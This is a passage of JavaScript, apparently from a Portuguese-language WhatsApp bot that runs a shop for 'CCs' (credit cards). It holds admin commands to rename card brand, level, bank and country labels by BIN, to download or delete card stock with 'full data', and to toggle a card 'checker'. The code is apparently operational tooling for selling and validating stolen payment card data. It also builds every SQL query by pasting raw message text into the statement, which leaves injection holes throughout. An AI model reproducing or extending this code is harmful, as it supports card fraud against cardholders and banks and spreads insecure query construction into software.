                await DataBase_Better.prepare(`INSERT INTO CCs_PRECOS_NIVEL (NIVEL) VALUES ('${NOVO_NOME_PARAM}') ON CONFLICT DO NOTHING`).run()
                await DataBase_Better.prepare(`INSERT INTO BINPERSONALIZADA_BANDEIRA_NIVEL (CONTEM_NOME,NOVO_NOME) VALUES ('${CONTEM_PARAM}','${NOVO_NOME_PARAM}')`).run()
                // await DataBase_Better.prepare(`UPDATE CCS SET NIVEL = '${NOVO_NOME_PARAM}' WHERE NIVEL = '${CONTEM_PARAM}'`).run()

                Texto = `🛠️ AGORA, QUANDO ABASTECER UMA CC ONDE NO NOME DA (BANDEIRA) TEM *${CONTEM_PARAM}*, O BOT VAI TROCAR O NOME DO (NIVEL) PARA *${NOVO_NOME_PARAM}*.

AS QUE JÁ ESTÃO NO ESTOQUE, NÃO ALTEREI, CASO QUEIRA QUE SE ENQUADREM NO NOVO AJUSTE, BASTA BAIXAR O ESTOQUE, DELETAR TUDO E REABASTECER.


◎ ══════ ❈ ══════ ◎
*BAIXE TODAS AS CCS DO ESTOQUE*
◎ ══════ ❈ ══════ ◎

/baixarestoqueccs
/baixarestoqueccsfull (Full Dados)

◎ ══════ ❈ ══════ ◎
*DELETE TODAS AS CCS DO ESTOQUE*
◎ ══════ ❈ ══════ ◎

/deletarestoqueccs
/deletarestoqueccsfull (Full Dados)
┕━━━━╗✹╔━━━━┙`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Algo deu errado...`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/delpersobanivel") > -1 && Adms.includes(Numero)) {

            await DataBase_Better.prepare(`DELETE FROM BINPERSONALIZADA_BANDEIRA_NIVEL`).run();
            Texto = `Lista de Niveis personalizados de acordo com Bandeiras deletada com sucesso!`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳


        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/personalizar") > -1 && Adms.includes(Numero)) {
            try {

                if (Mensagem_Texto.indexOf("bandeira") > -1) {
                    NOME_PARAMENTRO_PERSONALIZAR = "BANDEIRA"
                } else if (Mensagem_Texto.indexOf("nivel") > -1) {
                    NOME_PARAMENTRO_PERSONALIZAR = "NIVEL"
                } else if (Mensagem_Texto.indexOf("banco") > -1) {
                    NOME_PARAMENTRO_PERSONALIZAR = "BANCO"
                } else if (Mensagem_Texto.indexOf("pais") > -1) {
                    NOME_PARAMENTRO_PERSONALIZAR = "PAIS"
                } else {
                    Texto = `Comando inválido!`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }

                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 6) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                CONTEM_PARAM = msg[1]
                NOVO_NOME_PARAM = msg[2].toString().toUpperCase().replace(/[^a-zA-Z\s]/igm, '')

                Array_Temp = await DataBase_Better.prepare(`SELECT * FROM BINPERSONALIZADA_${NOME_PARAMENTRO_PERSONALIZAR} WHERE NOVO_NOME = '${NOVO_NOME_PARAM}'`).all();
                if (Array_Temp.length > 0) {

                    Texto = `JÁ TEM UMA CONFIGURAÇÃO QUE TRANSFORMA ALGUMA COISA EM ${NOVO_NOME_PARAM}...

*RECOMENDAÇÕES:*

LISTE TUDO QUE VOCÊ PERSONALIZOU, DELETE E FAÇA NOVAMENTE:

◎ ══════ ❈ ══════ ◎
*VER LISTA PERSONALIZADAS POR VOCÊ*
◎ ══════ ❈ ══════ ◎

/listabinpersonbandeira
/listabinpersonnivel
/listabinpersonbanco
/listabinpersonpais
┕━━━━╗✹╔━━━━┙

━━━━━━━━━━━━━━━━━━━━

◎ ══════ ❈ ══════ ◎
*DELETAR LISTAS DE BINS PERSONALIZADAS*
◎ ══════ ❈ ══════ ◎

/delpersobandeira
/delpersonivel
/delpersobanco
/delpersopais`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                Array_Temp = await DataBase_Better.prepare(`SELECT * FROM BINPERSONALIZADA_${NOME_PARAMENTRO_PERSONALIZAR} WHERE CONTEM_NOME = '${CONTEM_PARAM}'`).all();
                if (Array_Temp.length > 0) {

                    Texto = `JÁ TEM UMA CONFIGURAÇÃO QUE TRANSFORMA *${CONTEM_PARAM}* EM OUTRA COISA...

*RECOMENDAÇÕES:*

LISTE TUDO QUE VOCÊ PERSONALIZOU, DELETE E FAÇA NOVAMENTE:

◎ ══════ ❈ ══════ ◎
*VER LISTA PERSONALIZADAS POR VOCÊ*
◎ ══════ ❈ ══════ ◎

/listabinpersonbandeira
/listabinpersonnivel
/listabinpersonbanco
/listabinpersonpais
┕━━━━╗✹╔━━━━┙

━━━━━━━━━━━━━━━━━━━━

◎ ══════ ❈ ══════ ◎
*DELETAR LISTAS DE BINS PERSONALIZADAS*
◎ ══════ ❈ ══════ ◎

/delpersobandeira
/delpersonivel
/delpersobanco
/delpersopais`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }

                await DataBase_Better.prepare(`INSERT INTO CCs_PRECOS_${NOME_PARAMENTRO_PERSONALIZAR} (${NOME_PARAMENTRO_PERSONALIZAR}) VALUES ('${NOVO_NOME_PARAM}') ON CONFLICT DO NOTHING`).run()
                await DataBase_Better.prepare(`INSERT INTO BINPERSONALIZADA_${NOME_PARAMENTRO_PERSONALIZAR} (CONTEM_NOME,NOVO_NOME) VALUES ('${CONTEM_PARAM}','${NOVO_NOME_PARAM}')`).run()
                // await DataBase_Better.prepare(`UPDATE CCS SET ${NOME_PARAMENTRO_PERSONALIZAR} = '${NOVO_NOME_PARAM}' WHERE ${NOME_PARAMENTRO_PERSONALIZAR} = '${CONTEM_PARAM}'`).run()

                Texto = `🛠️ AGORA, QUANDO ABASTECER UMA CC ONDE NO NOME DO(A) ${NOME_PARAMENTRO_PERSONALIZAR} TEM *${CONTEM_PARAM}*, O BOT VAI TROCAR O NOME DO(A) ${NOME_PARAMENTRO_PERSONALIZAR} PARA *${NOVO_NOME_PARAM}*.

AS QUE JÁ ESTÃO NO ESTOQUE, NÃO ALTEREI, CASO QUEIRA QUE SE ENQUADREM NO NOVO AJUSTE, BASTA BAIXAR O ESTOQUE, DELETAR TUDO E REABASTECER.


◎ ══════ ❈ ══════ ◎
*BAIXE TODAS AS CCS DO ESTOQUE*
◎ ══════ ❈ ══════ ◎

/baixarestoqueccs
/baixarestoqueccsfull (Full Dados)

◎ ══════ ❈ ══════ ◎
*DELETE TODAS AS CCS DO ESTOQUE*
◎ ══════ ❈ ══════ ◎

/deletarestoqueccs
/deletarestoqueccsfull (Full Dados)
┕━━━━╗✹╔━━━━┙`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                return
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Algo deu errado... Verifique se colocou o nome do(a) ${NOME_PARAMENTRO_PERSONALIZAR} correto!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/delperso") > -1 && Adms.includes(Numero)) {

            if (Mensagem_Texto.indexOf("bandeira") > -1) {
                NOME_PARAMENTRO_PERSONALIZAR = "BANDEIRA"
            } else if (Mensagem_Texto.indexOf("nivel") > -1) {
                NOME_PARAMENTRO_PERSONALIZAR = "NIVEL"
            } else if (Mensagem_Texto.indexOf("banco") > -1) {
                NOME_PARAMENTRO_PERSONALIZAR = "BANCO"
            } else if (Mensagem_Texto.indexOf("pais") > -1) {
                NOME_PARAMENTRO_PERSONALIZAR = "PAIS"
            } else {
                Texto = `Comando inválido!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            await DataBase_Better.prepare(`DELETE FROM BINPERSONALIZADA_${NOME_PARAMENTRO_PERSONALIZAR}`).run();
            Texto = `Lista de *${NOME_PARAMENTRO_PERSONALIZAR}* personalizados(as) deletada com sucesso!`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/listabinperson") > -1 && Adms.includes(Numero)) {

            if (Mensagem_Texto.indexOf("bandeira") > -1) {
                NOME_PARAMENTRO_PERSONALIZAR = "BANDEIRA"
            } else if (Mensagem_Texto.indexOf("nivel") > -1) {
                NOME_PARAMENTRO_PERSONALIZAR = "NIVEL"
            } else if (Mensagem_Texto.indexOf("banco") > -1) {
                NOME_PARAMENTRO_PERSONALIZAR = "BANCO"
            } else if (Mensagem_Texto.indexOf("pais") > -1) {
                NOME_PARAMENTRO_PERSONALIZAR = "PAIS"
            } else {
                Texto = `Comando inválido!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            db = new sqlite3.Database(Diretorio_SQLITE_Principal, async (error) => {
                Array_Montando = []
                SQL = `SELECT _rowid_,* FROM BINPERSONALIZADA_${NOME_PARAMENTRO_PERSONALIZAR}`
                Array_Montando.push(`*LISTA ${NOME_PARAMENTRO_PERSONALIZAR} PERSONALIZADAS*`)
                Array_Montando.push("")

                db.each(SQL, async (err, Linha) => {
                    CONTEM_NOME = Linha["CONTEM_NOME"]
                    NOVO_NOME = Linha["NOVO_NOME"]
                    Array_Montando.push(`*${CONTEM_NOME}* Vira *${NOVO_NOME}*`)
                    Array_Montando.push("")

                }, async () => {
                    Texto = `${Array_Montando.join("\n")}`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                })
            })
            return;
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳





        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/ativarchkpri===") > -1 && Adms.includes(Numero)) {
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "") {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            if (msg[1] === "0") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '0' WHERE PARAMETRO = 'ATIVAR_CHK'`).run()
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '0' WHERE PARAMETRO = 'ATIVAR_CHK_SECUNDARIO'`).run()
                Texto = `*Checker Primário Desativado! (Caso o Secundário esteja ativo, desativei também!)*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else if (msg[1] === "1") {
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '1' WHERE PARAMETRO = 'ATIVAR_CHK'`).run()
                Texto = `*Checker Primário Ativado! (Caso queira habilitar o Secundário digite /ativarchksec===1)*`
